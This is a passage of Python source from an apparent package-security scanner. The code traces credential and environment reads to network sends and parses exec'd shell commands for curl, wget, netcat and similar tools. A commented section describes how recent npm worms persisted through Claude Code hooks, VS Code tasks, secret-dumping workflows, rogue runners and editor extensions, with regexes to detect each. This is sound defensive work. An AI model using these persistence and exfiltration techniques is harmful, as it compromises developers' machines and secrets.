        if any((a or b) in _LD_OPTION_KEYS for a, b in _LD_MEMBER_RE.findall(m.group(2))):
            options.append((name, m.end(), end))
        else:
            assigns.append((name, m.end(), end))
    for k, m in enumerate(_LD_COLLECT_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        if not in_literal(m.start(1)):
            name = _ld_key(text, m.group(1), m.end(1))
            if name is not None:
                assigns.append((name, m.end(), m.end() + len(_call_args(text[m.end():m.end() + _DD_ARG_SPAN]))))
    for k, m in enumerate(_LD_MERGE_RE.finditer(text) if "assign" in text else ()):   # `Object.assign(o, …)`
        if k >= _DD_MAX_ASSIGNS:
            break
        if not in_literal(m.start()):
            name = _ld_key(text, m.group(1), m.end(1))
            if name is not None:
                assigns.append((name, m.end(), m.end() + len(_call_args(text[m.end():m.end() + _DD_ARG_SPAN]))))
    loops = [(m.group(1) or m.group(3), m.start(2) if m.group(2) else m.start(4),
              m.end(2) if m.group(2) else m.end(4))
             for k, m in zip(range(_DD_MAX_ASSIGNS), _DD_FOR_RE.finditer(text))
             if not in_literal(m.start()) and (m.group(1) or m.group(3)) not in _LD_NOT_NAMES]
    for k, m in enumerate(_LD_FOR_DESTRUCT_RE.finditer(text)):  # `for (const [k, v] of …)`, `for k, v in …:`
        if k >= _DD_MAX_ASSIGNS:
            break
        if in_literal(m.start()):
            continue
        g = 1 if m.group(1) is not None else 3
        for part in m.group(g).split(","):
            name = _DD_DESTRUCT_NAME_RE.search(part.strip().strip("()").strip())
            if name is not None and name.group(1) not in _LD_NOT_NAMES:
                loops.append((name.group(1), m.start(g + 1), m.end(g + 1)))
    # the names that hold a path outside the package (see above): given one,
    # or a path built on one (a join, a sum, a template)
    outside = set()
    for name, lo, hi in assigns[:plain]:
        value = text[lo:hi].strip()
        if _LD_PATH_EXPR_RE.match(value) is not None and _LD_OWN_FOLDER_RE.search(value) is None \
                and (_LD_FS_ROOT_RE.match(value) is not None or _LD_HOME_RE.search(value) is not None):
            outside.add(name)
    for _ in range(_DD_PASSES if outside else 0):
        grown = False
        for name, lo, hi in assigns[:plain]:
            if name not in outside and _LD_PATH_EXPR_RE.match(text, lo, hi) is not None \
                    and _LD_OWN_FOLDER_RE.search(text, lo, hi) is None \
                    and _ld_names_in(text, lo, hi, outside, in_literal) is not None:
                outside.add(name)
                grown = True
        if not grown:
            break
    # a copy's destination, of a file outside the package (`shutil.copy2(db,
    # 'tmp.db')`, `fs.copyFileSync(p, dst)`): a name or a literal it is read by
    for k, m in enumerate(_LD_COPY_RE.finditer(text) if "cop" in text else ()):
        if k >= _LD_MAX:
            break
        if in_literal(m.start()):
            continue
        args = _call_args(text[m.end():m.end() + _DD_ARG_SPAN])
        parts = _ld_split_args(args)
        if len(parts) < 2:
            continue
        (a, b), (c, d) = parts[0], parts[1]
        lead = len(args[a:b]) - len(args[a:b].lstrip())
        dest = args[c:d].strip()
        if (_LD_PLAIN_LITERAL_RE.match(dest) is not None or _IDENT_TOKEN_RE.fullmatch(dest) is not None) \
                and _ld_outside(text, m.end() + a + lead, m.end() + b, True, outside, in_literal):
            outside.add(dest)
    funcs, params, defined_at = [], {}, {}          # (start, name); name -> [its parameters], where it is defined
    func_ms = []                                    # the matches, for where their bodies end
    classes = None                                  # (start, name) of the classes, once a constructor is found
    for k, m in enumerate(_LD_FUNC_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        name = m.group(1) or m.group(3) or m.group(5) or m.group(9)
        funcs.append((m.start(), name))
        func_ms.append(m)
        plist = next((g for g in (m.group(2), m.group(4), m.group(6), m.group(7), m.group(8), m.group(10))
                      if g is not None), "")
        names = _ld_params(plist)
        if names and name not in params and len(params) < _LD_MAX:
            params[name] = names
            defined_at[name] = m.start()
        if names and name in _LD_CONSTRUCTORS:      # the class's: `new C(…)`, `C(…)`
            if classes is None:
                classes = [(c.start(), c.group(1)) for _, c in zip(range(_DD_MAX_ASSIGNS), _LD_CLASS_RE.finditer(text))
                           if not in_literal(c.start())]
            c = bisect.bisect_left([a for a, _ in classes], m.start()) - 1
            if c >= 0 and classes[c][1] not in params and len(params) < _LD_MAX:
                params[classes[c][1]] = names
                defined_at[classes[c][1]] = m.start()
    func_starts = [a for a, _ in funcs]
    call_re = (re.compile(_DV_NAME_HEAD + "(" + "|".join(re.escape(n) for n in sorted(params)) + r")\s*\(")
               if params else None)
    sources = sorted(_ld_sources(text, in_literal, outside, {name for _, name in funcs}))
    metadata_names = [(name, lo) for name, lo, hi in assigns if _LD_METADATA_RE.search(text, lo, hi) is not None]
    if not sources and not metadata_names:
        return None
    source_starts = [s[0] for s in sources]
    followed = {}                                   # name -> (kind, what, through a parameter): the data it holds
    origins = {}                                    # name -> [(where it was given it, where it holds it or None)]
    long = len(text) > _LD_LONG
    called = set()                                  # the followed names of functions: their calls hold it

    def near(name, pos):
        """May what `name` holds reach `pos`? In a long text (a bundle, whose
        modules reuse names: `data`, `cb`, `e`, and are wrapped in calls that
        hold them: `require_x = __commonJS({…})`), only _LD_NEAR characters
        from where the name was given it; a parameter, in its function (two
        functions' parameters of one name are two names)."""
        return any((not long or abs(pos - o) <= _LD_NEAR) and (scope is None or scope[0] <= pos <= scope[1])
                   for o, scope in origins.get(name, ()))

    def bind(name, got, pos, scope=None):
        """`name` holds `got` from `pos` (where it does not yet: also from
        there), within `scope` (a parameter's function): is that new?"""
        if name not in followed:
            followed[name] = got
            origins[name] = [(pos, scope)]
            return True
        if not near(name, pos):
            origins[name].append((pos, scope))
            return True
        return False
    # the path a read is given: what the read gives is the file's, not the
    # path's (a file under a folder named for the user is not the user's name)
    spans = []
    for k, m in enumerate(_LD_SEAL_RE.finditer(text)):
        if k >= _LD_MAX:
            break
        first = _call_first_arg(_call_args(text[m.end():m.end() + _DD_ARG_SPAN]))
        if first.strip():
            spans.append((m.end(), m.end() + len(first)))
    # and a program's options: the environment and the folder a child process
    # is given are the program's, not data (`spawn(cmd, args, { env:
    # __spreadValues({}, process.env) })` gives a bundle's helper no data)
    for k, m in enumerate(_LD_EXEC_SEND_RE.finditer(text)):
        if k >= _LD_MAX:
            break
        if not in_literal(m.start()):
            args = _call_args(text[m.end():m.end() + _DD_ARG_SPAN])
            spans.extend(_ld_process_options(text, m.end(), m.end() + len(args)))
    for k, m in enumerate(_LD_ENV_KWARG_RE.finditer(text) if "env" in text else ()):
        if k >= _LD_MAX:
            break
        if not in_literal(m.start()):
            value = _call_first_arg(_call_args(text[m.end():m.end() + _DD_ARG_SPAN]))
            if value:
                spans.append((m.end(), m.end() + len(value)))
    sealed = []
    for a, b in sorted(spans):
        if sealed and a <= sealed[-1][1]:
            sealed[-1] = (sealed[-1][0], max(sealed[-1][1], b))
        else:
            sealed.append((a, b))
    sealed_starts = [a for a, _ in sealed]

    def is_sealed(pos):
        k = bisect.bisect_right(sealed_starts, pos) - 1
        return k >= 0 and pos < sealed[k][1]

    def read_in(spans, loose=False):
        """(kind, what, through a parameter) of the first read, or of a
        followed name, in the spans (in an address, not of a variable of the
        environment, the instance's metadata or the public IP address, but
        `loose`)."""
        for lo, hi, address in spans:
            k = bisect.bisect_left(source_starts, lo)
            while k < len(sources) and sources[k][0] < hi:
                if (not address or loose or sources[k][3] not in _LD_NOT_IN_ADDRESS or sources[k][4] == _LD_WHOLE_ENV) \
                        and not is_sealed(sources[k][0]):
                    return sources[k][3], sources[k][4], False
                k += 1
            if followed:
                for m in _LD_NAME_TOKEN_RE.finditer(text, lo, hi):
                    name, end = m.group(), m.end()
                    if name in _LD_RECEIVERS:       # a receiver's member: `this.x`; its method's call: `this.f()`
                        member = _LD_FIRST_MEMBER_RE.match(text, end)
                        if member is not None:
                            name, end = name + "." + (member.group(1) or member.group(2)), member.end()
                        else:
                            method = _LD_METHOD_CALL_RE.match(text, end)
                            if method is None or method.group(1) not in called:
                                continue
                            name, end = method.group(1), method.end(1)
                    got = followed.get(name)
                    if got is not None and near(name, m.start()) \
                            and (not address or loose or got[0] not in _LD_NOT_IN_ADDRESS
                                            or got[1] == _LD_WHOLE_ENV) \
                            and not in_literal(m.start()) and not is_sealed(m.start()) \
                            and (name not in called or _LD_CALLED_RE.match(text, end) is not None) \
                            and (got[1] != _LD_WHOLE_ENV or _LD_MEMBER_READ_RE.match(text, end) is None) \
                            and not _ld_tested(text, m.start(), end):
                        return got
        return None

    # the names given a value composed with a literal (`label + '.' + domain`):
    # a DNS lookup of one sends what it holds, a lookup of the machine's own name does not
    composed = set()
    for name, lo in metadata_names:
        bind(name, ("credentials", "the instance's metadata", False), lo)
    for name, lo, hi in assigns:
        if name not in followed or not near(name, lo):
            got = read_in(_ld_value_spans(text, lo, hi))
            if got is not None and bind(name, got, lo) and _LD_COMPOSED_RE.search(text, lo, hi) is not None:
                composed.add(name)
    for _at, end, opening, kind, what in sources:  # what a read gives: its callback, `with … as`, `.then(…)`
        if opening < 0:
            continue
        args = _call_args(text[opening:opening + _DD_ARG_SPAN])
        for cb in _DD_ARG_CALLBACK_RE.finditer(args):
            name = cb.group(1) or cb.group(2) or cb.group(3)
            if name not in _LD_NOT_NAMES and not in_literal(opening + cb.start()):
                bind(name, (kind, what, False), opening + cb.start())
        pos = opening + len(args) + 1
        m = _DD_AS_RE.match(text, pos)
        if m is not None and m.group(1) not in _LD_NOT_NAMES:
            bind(m.group(1), (kind, what, False), pos)
        for _ in range(_DD_THEN_MAX):
            h = _DD_THEN_HEAD_RE.match(text, pos)
            if h is None:
                break
            then_args = _call_args(text[h.end():h.end() + _DD_ARG_SPAN])
            for name in _ld_then_params(then_args):
                bind(name, (kind, what, False), h.end())
            pos = h.end() + len(then_args) + 1
    ends = {}                                       # index in funcs -> where its body ends (None: not known)

    def body_end(k):
        if k not in ends:
            ends[k] = _ld_func_end(text, func_ms[k], in_literal)
        return ends[k]

    def owner(pos):
        """The index in funcs of the innermost function whose body holds pos
        (a function defined before pos whose body ends before it does not),
        else -1."""
        k = bisect.bisect_right(func_starts, pos) - 1
        for _ in range(_LD_MAX):
            if k < 0:
                return -1
            end = body_end(k)
            if end is None or end > pos:
                return k
            k -= 1
        return -1

    def scope_of(fname):
        """Where the parameters of the script's function `fname` are its
        own: (its definition, its body's end), or None when that is not known."""
        at = defined_at[fname]
        k = bisect.bisect_left(func_starts, at)
        end = body_end(k) if k < len(funcs) and func_starts[k] == at else None
        return None if end is None else (at, end)

    returns = []                                    # (function, start, end) of what a function returns
    for k, m in enumerate(_DD_RETURN_RE.finditer(text)):
        if k >= _DD_MAX_CALLS:
            break
        end = _ld_statement_end(text, m.start(1))   # (read over rows, as an assignment's value is)
        if not in_literal(m.start()) and _LD_FUNC_VALUE_RE.match(text, m.start(1), end) is None:
            at = owner(m.start())
            if at >= 0:
                returns.append((funcs[at][1], m.start(1), end))
    # (the calls of the script's functions, and the callbacks on names, read
    # once: each pass reads them with what is followed by then)
    calls = []                                      # (start, end, function, its arguments)
    for k, c in enumerate(call_re.finditer(text) if call_re is not None else ()):
        if k >= _LD_MAX:
            break
        if not in_literal(c.start()):
            calls.append((c.start(), c.end(), c.group(1), _call_args(text[c.end():c.end() + _DD_ARG_SPAN])))
    ons = []                                        # (start, the name, the callback's parameter)
    for k, m in enumerate(_DD_CALLBACK_RE.finditer(text)):
        if k >= _DD_MAX_CALLS:
            break
        on = _ld_key(text, m.group(1), m.end(1))
        if on is not None and m.group(2) not in _LD_NOT_NAMES and not in_literal(m.start()):
            ons.append((m.start(), on, m.group(2)))
    # the callbacks the script's own functions are given: (the callback's
    # parameters, the callback, [the arguments of each call of the
    # function's parameter in its body]): `collect((info) => …)` and
    # `function collect(cb) { … cb(null, data) }` give info data
    callbacks = []
    for start, end, fname, args in calls:
        for i, (a, b) in enumerate(_ld_split_args(args)):
            if i >= len(params[fname]):
                break
            head = _LD_CALLBACK_HEAD_RE.match(text, end + a, end + b)
            if head is None:
                continue
            names = _ld_params(next(g for g in head.groups() if g is not None))
            f = bisect.bisect_left(func_starts, defined_at[fname])
            if not names or f >= len(funcs) or func_starts[f] != defined_at[fname]:
                continue
            lo = defined_at[fname]
            hi = body_end(f)
            hi = min(len(text), lo + _LD_BODY_SPAN) if hi is None else hi
            uses = re.compile(_DV_NAME_HEAD + re.escape(params[fname][i]) + r"\s*\(")
            inner = []                              # the arguments of each call of the parameter
            for j, u in enumerate(uses.finditer(text, lo, hi)):
                if j >= _LD_MAX:
                    break
                if not in_literal(u.start()):
                    given = _call_args(text[u.end():u.end() + _DD_ARG_SPAN])
                    inner.append([(u.end() + x, u.end() + y) for x, y in _ld_split_args(given)])
            if inner:
                callbacks.append((names, (end + a, end + b), inner))
    # a thread's target given its arguments: its parameters
    threads = []
    for k, m in enumerate(_LD_THREAD_RE.finditer(text) if params and "target" in text else ()):
        if k >= _LD_MAX:
            break
        if not in_literal(m.start()) and m.group(1) in params:
            threads.append((m.group(1), m.end(), _call_args(text[m.end():m.end() + _DD_ARG_SPAN])))
    thens, then_names = [], set()                   # (start, function, [(parameter, its callback)]): `f().then(…)`

    def follow(name, got, lo, hi, at=None, scope=None):
        """`name` holds `got`, from text[lo:hi] (`at`: where it is given it
        instead, a parameter's function; `scope`: where it holds it): is that
        new?"""
        if not bind(name, got, lo if at is None else at, scope):
            return False
        if _LD_COMPOSED_RE.search(text, lo, hi) is not None:
            composed.add(name)
        return True

    for _ in range(_DD_PASSES):
        grown = False
        for name, lo, hi in assigns + loops:
            if name not in followed or not near(name, lo):
                got = read_in(_ld_value_spans(text, lo, hi))
                if got is not None and follow(name, got, lo, hi):
                    grown = True
        for name, lo, hi in options:
            if name not in followed or not near(name, lo):
                got = read_in([(lo, hi, True)])
                if got is not None and follow(name, got, lo, hi):
                    grown = True
        for start, on, param in ons:
            if on in followed and near(on, start) and bind(param, followed[on], start):
                grown = True
        # (what a function returns from its parameters depends on the call: not followed)
        for name, lo, hi in returns + arrows:
            if name not in _LD_NOT_NAMES and (name not in followed or not near(name, lo)):
                got = read_in(_ld_value_spans(text, lo, hi))
                if got is not None and not got[2] and follow(name, got, lo, hi):
                    called.add(name)
                    grown = True
        if called - then_names:                     # `collect().then((d) => …)`, `this.info().then(…)`
            then_names = set(called)
            heads = re.compile(_LD_OWN_CALL_HEAD + "|".join(re.escape(n) for n in sorted(then_names)) + r")\s*\(")
            thens = []
            for k, c in enumerate(heads.finditer(text)):
                if k >= _LD_MAX:
                    break
                if in_literal(c.start()):
                    continue
                links, pos = [], c.end() + len(_call_args(text[c.end():c.end() + _DD_ARG_SPAN])) + 1
                for _ in range(_DD_THEN_MAX):
                    h = _DD_THEN_HEAD_RE.match(text, pos)
                    if h is None:
                        break
                    then_args = _call_args(text[h.end():h.end() + _DD_ARG_SPAN])
                    for name in _ld_then_params(then_args):
                        links.append((name, (h.end(), h.end() + len(then_args))))
                    pos = h.end() + len(then_args) + 1
                if links:
                    thens.append((c.start(), c.group(1), links))
        for start, name, links in thens:
            if near(name, start):
                for param, scope in links:
                    if bind(param, followed[name], scope[0], scope):
                        grown = True
        for names, scope, inner in callbacks:       # a callback's parameters: what the function calls it with
            for args in inner:
                for i, (lo, hi) in enumerate(args[:len(names)]):
                    if names[i] not in followed or not near(names[i], scope[0]):
                        got = read_in(_ld_value_spans(text, lo, hi))
                        if got is not None and follow(names[i], got, lo, hi, scope[0], scope):
                            grown = True
        for fname, start, args in threads:          # a thread's target: its parameters
            at = defined_at[fname]
            for param, lo, hi in _ld_bound(text, start, args, params[fname]):
                if param not in followed or not near(param, at):
                    got = read_in(_ld_value_spans(text, lo, hi))
                    if got is not None and follow(param, (got[0], got[1], True), lo, hi, at, scope_of(fname)):
                        grown = True
        for start, end, fname, args in calls:      # a function of the script's called with data: its parameters
            at = defined_at[fname]
            for param, lo, hi in _ld_bound(text, end, args, params[fname]):
                if _LD_FUNC_VALUE_RE.match(text, lo, hi) is not None:
                    continue                        # (a callback: code run later, not data given)
                if param not in followed or not near(param, at):
                    got = read_in(_ld_value_spans(text, lo, hi))
                    if got is not None and follow(param, (got[0], got[1], True), lo, hi, at, scope_of(fname)):
                        grown = True
        if not grown:
            break

    found, in_address = [], []                      # sends of data; sends of what an address may hold

    def first_send(pattern, addresses, where=None, process=False):
        """A send `pattern` finds whose data holds what the script read:
        its first `addresses` arguments are addresses (-1: all of them);
        `where`: what its arguments hold (_LD_COMPOSED_RE: a value composed
        with a literal, or a name given one)."""
        for k, s in enumerate(pattern.finditer(text)):
            if k >= _LD_MAX:
                return
            if in_literal(s.start()):
                continue
            args = _call_args(text[s.end():s.end() + _DD_ARG_SPAN])
            end = s.end() + len(args)
            if _ld_defined(text, s.start(), end):
                continue
            if where is not None and where.search(args) is None \
                    and not (where is _LD_COMPOSED_RE
                             and _ld_names_in(text, s.end(), end, composed, in_literal) is not None):
                continue
            spans = _ld_arg_spans(text, s.end(), end, len(args) + 1 if addresses < 0 else addresses, process)
            got = read_in(spans)
            if got is not None:
                found.append((s.start(), got[0], got[1]))
                return
            if not in_address:
                got = read_in(spans, True)
                if got is not None:
                    in_address.append((s.start(), got[0], got[1]))

    first_send(_LD_SEND_RE, 1)
    first_send(_LD_OPTIONS_SEND_RE, 0)
    first_send(_LD_REQUEST_SEND_RE, 2)
    first_send(_LD_ADDRESS_SEND_RE, -1)
    first_send(_LD_LOOKUP_SEND_RE, -1, _LD_COMPOSED_RE)
    first_send(_LD_EXEC_SEND_RE, 0, _LD_NET_PROGRAM_RE, True)
    connections = sorted({name for name, lo, hi in assigns[:plain]
                          if _LD_CONNECTION_RE.search(text, lo, min(hi, lo + 300)) is not None})
    if connections:
        first_send(re.compile(_DV_NAME_HEAD + "(?:" + "|".join(re.escape(n) for n in connections) + ")"
                              + _LD_WRITE_TAIL), 0)
    clients = {name for name, lo, hi in assigns[:plain]       # HTTP clients under the script's own names
               if _LD_CLIENT_RE.search(text, lo, min(hi, lo + 300)) is not None}
    for pattern, needle in ((_LD_CLIENT_IMPORT_RE, "import"), (_LD_CLIENT_AS_RE, " as ")):
        for k, m in enumerate(pattern.finditer(text) if needle in text else ()):
            if k >= _LD_MAX:
                break
            if not in_literal(m.start()):
                clients.add(m.group(1))
    clients = sorted(clients - _LD_NOT_NAMES)
    if clients:
        names = "(?:" + "|".join(re.escape(n) for n in clients)
        first_send(re.compile(_DV_NAME_HEAD + names + _LD_CLIENT_SEND_TAIL), 1)
        first_send(re.compile(_DV_NAME_HEAD + names + _LD_CLIENT_REQUEST_TAIL), 2)
    for k, m in enumerate(_LD_HOST_BUILT_RE.finditer(text)):  # data resolved in a host name: sent
        if k >= _LD_MAX:
            break
        g = 2 if m.group(2) is not None else (3 if m.group(3) is not None else 4)
        got = read_in([(m.start(g), m.end(g), True)])
        if got is not None:
            found.append((m.start(), got[0], got[1]))
            break
    if not found:                                   # a connection written to as it is made: https.request(o).end(d)
        for k, c in enumerate(_LD_CONNECTION_RE.finditer(text)):
            if k >= _LD_MAX or found:
                break
            if in_literal(c.start()):
                continue
            close = c.end() + len(_call_args(text[c.end():c.end() + _DD_ARG_SPAN]))
            w = _LD_WRITE_TAIL_RE.match(text, close + 1)
            if w is not None:
                end = w.end() + len(_call_args(text[w.end():w.end() + _DD_ARG_SPAN]))
                got = read_in(_ld_arg_spans(text, w.end(), end))
                if got is not None:
                    found.append((c.start(), got[0], got[1]))
    if found:
        at, kind, what = min(found)
        return at, kind, what, False
    if in_address:
        at, kind, what = min(in_address)
        return at, kind, what, True
    return None


# ---------------- Commands a script runs, read as programs (0.1.8) ----------------
# The command line a script hands a shell — os.system("…"), os.popen,
# subprocess.* given a string, child_process.exec/execSync, or `sh -c "…"`
# in an argument list — is read as a hook command's is (_sh_reasons): what it
# sends, uploads or looks up (a beacon is not read here: a script that runs a
# command may keep what it prints). The string's escapes are decoded; a hole
# of a template literal or an f-string is a character that names nothing.
_SH_EXEC_LINE_RE = re.compile(
    r"\b(?:system|popen|execSync|exec|getoutput|getstatusoutput|run|call|check_call|check_output|Popen)\s*\(\s*"
    r"""(?=[rbuRBUfF]{0,2}["'`]|[A-Za-z_$])"""
    r"""|\b(?:spawn|spawnSync|execFile|execFileSync|run|call|check_call|check_output|Popen)\s*\(\s*[\[(]?\s*"""
    r"""["'](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh["']\s*,\s*[\[(]?\s*["']-c["']\s*,\s*(?=[rbuRBUfF]{0,2}["'`])""")
_SH_EXEC_MAX = 50                # command lines read per text
_SH_CONCAT_MAX = 20              # pieces of a command line joined with +
_SH_EXEC_NEEDLES = ("curl", "wget", "nc ", "ncat", "netcat", "socat", "telnet", "nslookup", "dig ", "host ", "ping")
_SH_ESCAPES = {"n": "\n", "t": "\t", "r": "\r", "0": "\x00", "v": "\v", "f": "\f", "b": "\b"}


def _sh_literal_value(text, i):
    """The value of the string literal at text[i] (after its prefix letters),
    escapes decoded and a template's or f-string's holes made \\x02, else None."""
    got = _sh_literal_at(text, i)
    return None if got is None else got[0]


def _sh_literal_at(text, i):
    """(value, end) of the string literal at text[i] (see _sh_literal_value), else None."""
    j = i
    while j < len(text) and j - i < 2 and text[j] in "rbuRBUfF":
        j += 1
    prefix, i = text[i:j].lower(), j
    if i >= len(text) or text[i] not in "\"'`":
        return None
    q = text[i]
    triple = q != "`" and text.startswith(q * 3, i)
    close = q * 3 if triple else q
    raw, fmt, tpl = "r" in prefix, "f" in prefix, q == "`"
    out, k, n = [], i + len(close), min(len(text), i + HOOK_MAX_CHARS)
    while k < n:
        if text.startswith(close, k):
            return "".join(out), k + len(close)
        ch = text[k]
        if ch == "\n" and not triple and not tpl:
            return None
        if ch == "\\" and k + 1 < n:
            nxt = text[k + 1]
            out.append("\\" + nxt if raw else ("" if nxt == "\n" else _SH_ESCAPES.get(nxt, nxt)))
            k += 2
            continue
        if tpl and text.startswith("${", k) or fmt and ch == "{" and not text.startswith("{{", k):
            depth, k = 1, k + (2 if tpl else 1)
            while k < n and depth:
                depth += {"{": 1, "}": -1}.get(text[k], 0)
                k += 1
            out.append("\x02")
            continue
        if fmt and (text.startswith("{{", k) or text.startswith("}}", k)):
            out.append(ch)
            k += 2
            continue
        out.append(ch)
        k += 1
    return None


def exec_command_reasons(text):
    """The reasons the command lines `text` hands a shell give (see above)."""
    reasons = []
    for _at, r in _exec_command_flows(text):
        if r not in reasons:
            reasons.append(r)
    return reasons


def _sh_command_value(text, i, values):
    """The command line an exec call's argument at text[i] builds: string
    literals and names given one (`values`), joined with + (a name given
    none, or anything else, is a character that names nothing), else None."""
    parts, n = [], len(text)
    while len(parts) < _SH_CONCAT_MAX:
        while i < n and text[i] in " \t\n":
            i += 1
        got = _sh_literal_at(text, i)
        if got is not None:
            parts.append(got[0])
            i = got[1]
        else:
            name = _IDENT_TOKEN_RE.match(text, i)
            if name is None:
                break
            value = values.get(name.group())
            if value is None and not parts:
                return None
            parts.append("\x02" if value is None else value)
            i = name.end()
        while i < n and text[i] in " \t\n":
            i += 1
        if i >= n or text[i] != "+":
            break
        i += 1
    return "".join(parts) or None


_SH_EXEC_MEMO = (None, None)     # (text, answer), as _LD_MEMO


def _exec_command_flows(text):
    """[(offset, reason)]: the reasons each command line `text` hands a shell
    gives, and where it is handed over."""
    global _SH_EXEC_MEMO
    memo = _SH_EXEC_MEMO
    if memo[0] is text:
        return list(memo[1])
    answer = _exec_command_flows_of(text)
    _SH_EXEC_MEMO = (text, answer)
    return list(answer)


def _exec_command_flows_of(text):
    if not any(nd in text for nd in _SH_EXEC_NEEDLES):
        return []
    out, walk = [], _HookWalk()
    for at, cmd in _exec_command_lines(text):
        if _pipes_download_to_shell(cmd):           # (a hook's command reads these as the install test does)
            out.append((at, "pipes a download into a shell"))
        if any(runs_substituted_download(row) for row in cmd.split("\n")):
            out.append((at, _DL_CATEGORY_REASON["run"]))
        out.extend((at, r) for r in _sh_reasons(cmd, 0, True, walk))
    return out


_SH_LINES_MEMO = (None, None)    # (text, answer), as _LD_MEMO


def _exec_command_lines(text):
    """[(offset, command line)]: what each exec call of `text` is handed as
    a command line (a string literal, a name given one, or such pieces
    joined; _sh_command_value), and where; at most _SH_EXEC_MAX."""
    global _SH_LINES_MEMO
    memo = _SH_LINES_MEMO
    if memo[0] is text:
        return memo[1]
    out, values = [], None                          # values: name -> the string literal it is given
    for m in _SH_EXEC_LINE_RE.finditer(text):
        if len(out) >= _SH_EXEC_MAX:
            break
        if values is None:
            values = {}
            for k, a in enumerate(_DD_ASSIGN_RE.finditer(text)):
                if k >= _DD_MAX_ASSIGNS:
                    break
                got = _sh_literal_at(text, a.start(2) + len(a.group(2)) - len(a.group(2).lstrip()))
                if got is not None and a.group(1) not in values:
                    values[a.group(1)] = got[0]
        cmd = _sh_command_value(text, m.end(), values)
        if cmd:
            out.append((m.start(), cmd))
    out = tuple(out)
    _SH_LINES_MEMO = (text, out)
    return out


# ---------------- Persistence targets (0.1.7) ----------------
# Where the 2025-26 npm worms made themselves stay. Mini Shai-Hulud and the
# keyv wave committed a Claude Code SessionStart hook (.claude/settings.json)
# and a VS Code folder-open task (.vscode/tasks.json) to every repository they
# reached, each running the other's copy of the loader, so opening a checkout
# ran the worm; Shai-Hulud planted GitHub Actions workflows that dump every
# repository secret, and a discussion-triggered one that runs the discussion
# text on a self-hosted runner it registered on the victim's machine;
# GlassWorm pushed editor extensions with `code --install-extension`. No
# package needs to do any of this while it is installed, so each is a reason
# of the install-script test (CRITICAL in an install hook). Import-time code
# gets only the workflow that dumps every secret: a CLI's `init` command
# legitimately writes agent hooks, editor tasks, MCP servers and CI workflows.
#
# A settings file is named whole (".claude/settings.json", a template's
# `${home}/.claude/settings.json`) or as the two literals a path join takes
# (`path.join(home, ".claude", "settings.json")`, `Path.home() / ".claude" /
# "settings.json"`); _PERSIST_AGENT_PAIRS says which file each directory's
# tool runs commands from. The file must also be written: by a write call
# anywhere in the text (fs, fs-extra, pathlib, json.dump, open(…, "w"),
# shutil, Octokit's createOrUpdateFileContents), or by a shell write on a line
# that names it (a redirection, tee, cp, mv, PowerShell's Set-Content …).
_PERSIST_AGENT_SRC = (
    r"""(?:\.(?:claude|gemini)[/\\]settings(?:\.local)?|\.vscode[/\\](?:tasks|mcp)|\.cursor[/\\](?:hooks|mcp)"""
    r"""|(?<![\w.-])\.(?:mcp|claude))\.json(?![\w.-])""")
_PERSIST_AGENT_SPLIT_SRC = (
    r"""["'`]\.(claude|gemini|vscode|cursor)["'`]\s{0,20}[,+/]\s{0,20}["'`](settings(?:\.local)?|tasks|hooks|mcp)\.json["'`]""")
_PERSIST_AGENT_PAIRS = {"claude": ("settings", "settings.local"), "gemini": ("settings",),
                        "vscode": ("tasks", "mcp"), "cursor": ("hooks", "mcp")}
_PERSIST_WORKFLOW_SRC = r"""\.github[/\\]workflows\b|["'`]\.github["'`]\s{0,20}[,+/]\s{0,20}["'`]workflows\b"""
_PERSIST_EXT_DIR_SRC = (
    r"""[/\\]\.(?:vscode(?:-insiders|-oss|-server)?|cursor|windsurf|vscodium|positron)[/\\]extensions\b"""
    r"""|["'`]\.(?:vscode(?:-insiders|-oss|-server)?|cursor|windsurf|vscodium|positron)["'`]\s{0,20}[,+/]\s{0,20}"""
    r"""["'`]extensions["'`]""")
_PERSIST_WRITE_SRC = (
    r"""\b(?:writeFileSync|writeFile|appendFileSync|appendFile|createWriteStream|outputFileSync|outputFile"""
    r"""|outputJsonSync|outputJson|writeJsonSync|writeJson|copyFileSync|copyFile|cpSync|renameSync|symlinkSync"""
    r"""|write_text|write_bytes|createOrUpdateFileContents)\s*\(|\bjson\.dump\s*\(|\bshutil\.(?:copy\w*|move)\s*\("""
    r"""|\bopen\s*\([^()\n]{0,300}?["'][wax]b?\+?["']""")
_PERSIST_SHELL_WRITE_SRC = (
    r""">|\b(?:tee|cp|mv|install|ln|copy|xcopy)\s|\b(?:Set-Content|Out-File|Add-Content|Copy-Item|New-Item)\b"""
    r"""|\bgit\s+(?:add|commit)\b""")
_PERSIST_EXT_INSTALL_SRC = r"""--install-extension\b"""
# An editor's CLI at a command's start (a line start is written `(?<![^\n])`:
# under re.M, JavaScript's `^` would also match after \r and \u2028), and a
# runner's release or its config script. Each is matched once per line with
# what must follow it later on that line (_after_on_line): a pattern with a
# gap between the two, `code[^\n]{0,400}?--install-extension`, is searched
# again from every start, 400 times the text's length.
_PERSIST_EXT_CLI_SRC = (
    r"""(?:(?<![^\n])|[;&|(])[ \t]*(?:sudo[ \t]+)?(?:code|code-insiders|codium|cursor|windsurf|positron)(?:\.cmd|\.exe)?"""
    r"""[ \t]""")
_PERSIST_RUNNER_SRC = r"""actions/runner/releases|\bactions-runner-(?:linux|osx|win)-"""
_PERSIST_RUNNER_CONFIG_SRC = r"""\bconfig\.(?:sh|cmd)\b"""
_PERSIST_RUNNER_ARG_SRC = r"""--(?:token|url)\b"""
_SECRETS_DUMP_SRC = r"""\btoJSON\s*\(\s*secrets\s*\)"""
_PERSIST_AGENT_RE = re.compile(_PERSIST_AGENT_SRC)
_PERSIST_AGENT_SPLIT_RE = re.compile(_PERSIST_AGENT_SPLIT_SRC)
_PERSIST_WORKFLOW_RE = re.compile(_PERSIST_WORKFLOW_SRC)
_PERSIST_EXT_DIR_RE = re.compile(_PERSIST_EXT_DIR_SRC)
_PERSIST_WRITE_RE = re.compile(_PERSIST_WRITE_SRC)
_PERSIST_SHELL_WRITE_RE = re.compile(_PERSIST_SHELL_WRITE_SRC)
_PERSIST_EXT_INSTALL_RE = re.compile(_PERSIST_EXT_INSTALL_SRC)
_PERSIST_EXT_CLI_RE = re.compile(_PERSIST_EXT_CLI_SRC)
_PERSIST_RUNNER_RE = re.compile(_PERSIST_RUNNER_SRC)
_PERSIST_RUNNER_CONFIG_RE = re.compile(_PERSIST_RUNNER_CONFIG_SRC)
